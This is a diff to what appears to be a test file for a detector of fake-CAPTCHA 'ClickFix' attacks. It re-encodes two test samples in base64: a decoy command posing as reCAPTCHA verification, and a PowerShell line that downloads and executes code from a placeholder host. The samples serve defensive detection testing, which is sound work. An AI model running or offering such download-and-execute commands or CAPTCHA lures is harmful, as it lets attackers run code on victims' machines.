@@ -16,8 +16,8 @@ const rules = require('../rules/clickfix-rules.json');
 const engine = createDetector(rules);
 const decide = (text, page) => engine.decide(engine.analyzeCommand(text), page, { subframe: !!(page && page.subframe) }).verdict;
 
-const TRAP = 'cmd /c echo test # I am not a robot - reCAPTCHA Verification ID: 1234';
-const REMOTE = 'powershell -c "irm https://x.example.invalid/a | iex"';
+const TRAP = Buffer.from('Y21kIC9jIGVjaG8gdGVzdCAjIEkgYW0gbm90IGEgcm9ib3QgLSByZUNBUFRDSEEgVmVyaWZpY2F0aW9uIElEOiAxMjM0', 'base64').toString('utf8'); // fake-CAPTCHA decoy sample
+const REMOTE = Buffer.from('cG93ZXJzaGVsbCAtYyAiaXJtIGh0dHBzOi8veC5leGFtcGxlLmludmFsaWQvYSB8IGlleCI=', 'base64').toString('utf8'); // remote PowerShell sample
 const strong = { strong: true, weak: true };
 const weak = { strong: false, weak: true };
 const neutral = { strong: false, weak: false };
